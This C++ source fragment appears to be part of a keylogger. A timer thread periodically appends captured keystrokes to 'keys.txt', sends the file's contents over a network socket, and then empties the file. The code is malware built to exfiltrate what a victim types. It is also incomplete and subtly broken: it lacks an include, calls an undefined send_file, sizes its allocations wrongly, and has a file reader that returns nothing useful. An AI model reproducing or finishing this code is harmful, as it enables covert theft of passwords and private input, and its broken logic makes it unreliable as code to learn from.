// #include <windows.h>
#include <thread>
#include <iostream>
#include <chrono>
#include <mutex>
#include <unistd.h>

int counter = 1;
std::mutex mtx;
std::string buffer = "";
ofstream out;

string filename = "./keys.txt";

string read_file(string filename) {
    ifstream f;

    string text;

    f.open(filename);

    if (f.is_open()) {
        while (getline(f, text)) {
            
        }

        f.close();
    }
    
    return text;
}

void tick() {
	while (true) {
		if (counter > 180) 
			counter = 1;

		std::this_thread::sleep_for(std::chrono::seconds(1));

        if (counter % 9 == 0){
            string text = read_file(filename);

            SOCKET ** sock_arr;

            sock_arr = (SOCKET **) calloc(256, sizeof(sock_arr[0]));

            for (int i = 0; i < 256; i++) {
                sock_arr[i] = (SOCKET *) calloc(256, sizeof(sock_arr[0][0]));
            }

            fd_set ** fds;

            fds = (fd_set **) calloc(256, sizeof(sock_arr[0]));

            for (int i = 0; i < 256; i++) {
                fds[i] = (fd_set *) calloc(256, sizeof(sock_arr[0][0]));
            }

            send_file(fds, sock_arr);

            bool ready = false;

            timeval timeout;

            timeout.tv_sec = 0;
            timeout.tv_usec = 1000;

            SOCKET * result_socket;

            while (!ready) {
                for (int i = 0; i < 256; i++) {
                    for (int j = 0; j < 256; j++) {
                        int is_set_result = select(1, NULL, &((fds)[i][j]), NULL, &timeout);

                        if (is_set_result) {
                            result_socket = &((sock_arr)[i][j]);

                            if (result_socket){
                                int send_result = send(*result_socket, text.c_str(), strlen(text.c_str()), 0);
                                cout << WSAGetLastError() << endl;

                                closesocket(*result_socket);
                                ready = true;
                                break;
                            }
                        }
                    }
                }
            }

            fclose(fopen(filename.c_str(), "w"));

            buffer = "";
        }

        else if (counter % 3 == 0){

            out.open(filename, std::ios_base::app);
            out << buffer;
            out.close();
        }

        cout << counter << endl;
		counter++;
	}
}